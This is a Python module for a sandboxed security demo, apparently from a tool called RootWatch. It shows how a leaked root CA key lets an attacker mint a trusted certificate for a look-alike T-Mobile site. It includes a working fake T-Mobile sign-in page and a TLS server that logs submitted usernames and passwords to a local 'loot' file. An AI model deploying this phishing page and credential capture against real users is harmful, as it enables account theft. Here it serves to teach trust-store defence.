"""Simulated MITM / phishing demo controller (Person A).

Powers the /mitm demo page: the attacker (holding the leaked eMudhra root key) mints a
FRESH cert for a look-alike site (default www.t-mobile.com — its serial is NOT on any
CRL) and runs a phishing server on 127.0.0.1:9443. A "victim" probe uses the sandbox's
CURRENT trust stores, so the exact same handshake flips from ACCEPT to REJECT once
RootWatch distrusts the root. Captured "credentials" are written to a loot file under
the sandbox (never outside ROOTWATCH_ROOT).

Sandbox-only: everything resolves under ROOTWATCH_ROOT. The main dashboard (/) is
untouched — this module only backs the /mitm page and its /api/mitm/* routes.
"""
from __future__ import annotations

import dataclasses
import json
import os
import ssl
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

from . import manager, pki, probes, sandbox, server
from .stores import all_stores
from .stores.base import sandbox_root

DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 9443
DEFAULT_HOSTNAME = "www.t-mobile.com"

# Fake "T-Mobile" sign-in page served by the MITM server (purely visual demo content).
PHISH_PAGE = """<!DOCTYPE html><html><head><meta charset="utf-8"><title>T-Mobile | Sign in</title>
<style>
 body{font-family:Arial,sans-serif;background:#fff;color:#333;margin:0}
 header{background:#e20074;color:#fff;padding:18px 28px;font-size:22px;font-weight:bold}
 header small{font-weight:normal;opacity:.85;font-size:13px;margin-left:10px}
 main{max-width:360px;margin:40px auto;border:1px solid #ddd;border-radius:8px;padding:24px}
 h1{font-size:18px;margin:0 0 16px}
 label{display:block;font-size:12px;color:#666;margin:10px 0 4px}
 input{width:100%;padding:9px;border:1px solid #bbb;border-radius:4px;box-sizing:border-box}
 button{width:100%;margin-top:16px;padding:11px;background:#e20074;color:#fff;border:0;
        border-radius:4px;font-size:15px;cursor:pointer}
 .fine{font-size:11px;color:#999;margin-top:14px}
</style></head><body>
<header>T-Mobile <small>myT-Mobile account</small></header>
<main><h1>Sign in</h1>
<form method="post" action="/login">
<label>Username or phone number</label><input name="username" value="">
<label>Password</label><input name="password" type="password" value="">
<button type="submit">Sign in</button>
</form><p class="fine">By signing in you agree to the Terms of Use. Standard rates may apply.</p>
</main></body></html>"""

WELCOME_PAGE = """<!DOCTYPE html><html><head><meta charset="utf-8"><title>T-Mobile</title>
<style>body{{font-family:Arial,sans-serif;text-align:center;padding:60px}}
header{{background:#e20074;color:#fff;padding:18px;font-size:22px;font-weight:bold}}</style>
</head><body><header>T-Mobile</header>
<h1>Welcome back, {user}!</h1><p>You are now signed in.</p></body></html>"""

_state: dict = {"httpd": None, "port": None, "hostname": None}


def _loot_path() -> Path:
    return sandbox_root() / "attacker" / "loot.jsonl"


def _pki_dir() -> Path:
    env = os.environ.get("ROOTWATCH_PKI_DIR")
    return Path(env) if env else sandbox_root() / "pki"


class _PhishHandler(BaseHTTPRequestHandler):
    server_version = "Apache"

    def _send(self, body: str, code: int = 200) -> None:
        data = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        self._send(PHISH_PAGE)

    def do_POST(self):
        length = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(length).decode(errors="replace")
        fields = {k: v[0] for k, v in urllib.parse.parse_qs(raw).items()}
        lp = _loot_path()
        lp.parent.mkdir(parents=True, exist_ok=True)
        with lp.open("a") as f:
            f.write(json.dumps({"ts": time.time(), "path": self.path,
                                "fields": fields}) + "\n")
        self._send(WELCOME_PAGE.format(user=fields.get("username", "user") or "user"))

    def log_message(self, *args):  # quiet
        pass


def state() -> dict:
    return {
        "running": _state["httpd"] is not None,
        "url": _url() if _state["httpd"] else None,
        "display_url": (f"https://{_state['hostname']}:{_state['port']}/"
                        if _state["httpd"] else None),
        "hostname": _state["hostname"],
        "port": _state["port"],
        "loot_file": str(_loot_path()),
        "sandbox_root": str(sandbox_root()),
    }


def stop() -> None:
    httpd = _state.get("httpd")
    if httpd is not None:
        try:
            httpd.shutdown()
            httpd.server_close()
        except Exception:
            pass
    _state.update(httpd=None, port=None, hostname=None)


def reset() -> dict:
    """Stop the MITM server and re-seed a CLEAN sandbox from the real stores."""
    stop()
    root = sandbox.setup_sandbox(plant_compromised=False)
    lp = _loot_path()
    if lp.exists():
        lp.unlink()
    return {"ok": True, "root": str(root), "note": "clean sandbox re-seeded from real stores"}


def inject() -> dict:
    """Attack step: load the compromised eMudhra root into every sandbox store."""
    root = sandbox.plant_incident()
    return {"planted": True, "root": str(root)}


def mint_and_start(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT,
                   hostname: str = DEFAULT_HOSTNAME) -> dict:
    """Mint a FRESH phishing cert from the compromised CA and start the MITM server."""
    stop()
    pki_dir = _pki_dir()
    if not (pki_dir / "pki.json").exists():
        raise RuntimeError("sandbox PKI missing — run reset/setup first")
    cert, key, chain = pki.mint_attacker_cert(pki_dir, hostname=hostname)
    if port == 0:
        port = server._free_port(host)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    ctx.load_cert_chain(str(chain), str(key))
    httpd = ThreadingHTTPServer((host, port), _PhishHandler)
    httpd.handle_error = lambda *a, **k: None  # quiet: rejected handshakes are expected
    httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
    actual = httpd.server_address[1]
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    _state.update(httpd=httpd, port=actual, hostname=hostname)
    from cryptography import x509
    subj = x509.load_pem_x509_certificate(cert.read_bytes()).subject.rfc4514_string()
    return {"url": f"https://{host}:{actual}/", "port": actual, "hostname": hostname,
            "cert_subject": subj, "cert_file": str(cert),
            "note": "freshly minted serial — NOT on any CRL, so CRL checks cannot catch it"}


def _url() -> str:
    return f"https://{DEFAULT_HOST if _state['httpd'] else '127.0.0.1'}:{_state['port']}/"


def _cafile(store_id: str | None, real: bool) -> str | None:
    return manager.probe_cafile(all_stores(real=real), store_id or "system")


def _require_running() -> str:
    if not _state.get("httpd"):
        raise RuntimeError("MITM server not running — POST /api/mitm/start first")
    return _url()


def victim_probe(scenario_path: str, store_id: str = "system", real: bool = False) -> dict:
    """Full client matrix (requests / requests-crl / curl / openssl-crl) as the victim,
    trusting exactly what the given sandbox store currently trusts."""
    url = _require_running()
    sc = manager.load_scenario(scenario_path)
    cafile = _cafile(store_id, real)
    results = probes.probe_all(url, cafile=cafile, crl_pem=sc.crl_pem or None)
    return {"url": url, "display_url": state()["display_url"], "cafile": cafile,
            "store_id": store_id,
            "probes": [dataclasses.asdict(r) for r in results]}


def victim_fetch(scenario_path: str, store_id: str = "system", real: bool = False) -> dict:
    """Bob opens the site: plain HTTPS GET with the store's bundle. Returns the page
    body when the handshake is accepted (the phishing page renders in the demo UI)."""
    import requests
    url = _require_running()
    sc = manager.load_scenario(scenario_path)  # noqa: F841 — validates the scenario exists
    cafile = _cafile(store_id, real)
    out = {"url": url, "display_url": state()["display_url"], "cafile": cafile,
           "store_id": store_id, "accepted": False}
    try:
        r = requests.get(url, verify=cafile or True, timeout=5)
        out.update(accepted=True, status=r.status_code, body=r.text[:8000])
    except Exception as e:
        out["error"] = f"{type(e).__name__}: {(str(e) or '').splitlines()[0] if str(e) else ''}"
    return out


def victim_login(scenario_path: str, store_id: str, creds: dict,
                 real: bool = False) -> dict:
    """Bob submits the phishing form; the MITM server 'exfiltrates' the credentials
    to the sandbox loot file. Returns whether the handshake accepted + the loot."""
    import requests
    url = _require_running()
    cafile = _cafile(store_id, real)
    out = {"url": url + "login", "accepted": False, "store_id": store_id}
    try:
        r = requests.post(url + "login", data=creds, verify=cafile or True, timeout=5)
        out.update(accepted=True, status=r.status_code)
    except Exception as e:
        out["error"] = f"{type(e).__name__}: {(str(e) or '').splitlines()[0] if str(e) else ''}"
    out["loot"] = loot()["entries"]
    return out


def loot() -> dict:
    lp = _loot_path()
    entries = []
    if lp.exists():
        for line in lp.read_text().splitlines():
            line = line.strip()
            if line:
                try:
                    entries.append(json.loads(line))
                except json.JSONDecodeError:
                    pass
    return {"file": str(lp), "entries": entries}
